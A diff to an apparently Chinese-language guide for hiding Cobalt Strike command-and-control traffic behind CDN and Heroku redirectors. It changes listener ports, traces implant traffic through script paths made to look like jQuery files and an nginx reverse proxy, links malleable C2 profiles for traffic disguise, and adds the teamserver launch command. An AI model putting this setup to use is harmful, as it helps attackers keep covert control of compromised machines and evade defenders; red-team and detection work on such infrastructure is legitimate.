@@ -145,7 +145,7 @@ cs监听器设置
 	http hosts:  cdn地址
 	http host(stager):  cdn地址   
 	http port （c2）: 8080    # 这里得设置CDN支持转发的端口
-	http port （Bind）：8089
+	http port （Bind）：8899
 	profile:default
 	
 生成shellcode和exe使用第一个cdn的80生成
@@ -161,13 +161,15 @@ PS：
 
 ```
 判断是否上线http-stager： （首次上线的流量过程）
-exe -> CDN/jxx.1.slim.min.js(80) -> heroku(80) -> 防火墙80=8080 -> nginx反代8080=8089 -> 监听器2的8089
+exe -> CDN/jxx.1.slim.min.js(80) -> heroku(80) -> 防火墙80=8080 -> nginx反代8080=8899 -> 8899
 
 执行命令http-get、http-post等：（每次执行命令的流量过程） 
-exe -> CDN/jxx.min.js(8080) -> heroku(80) -> nginx反代8080=8089 -> 监听器2的8089
+exe -> CDN/jxx.min.js(8080) -> heroku(80) -> nginx反代8080=8899 -> 监听器2的8899
 ```
 
 cs流量伪装（具体伪装规则需自行百度编写）
+
+- 现成：https://github.com/threatexpress/malleable-c2
 
 ```
 # 判断上线流量伪装
@@ -201,5 +203,11 @@ http-get {
             header "Cookie";
         }
     }
+```
+
+运行
+
+```
+./teamserver IP 密码 规则文件
 ```
 
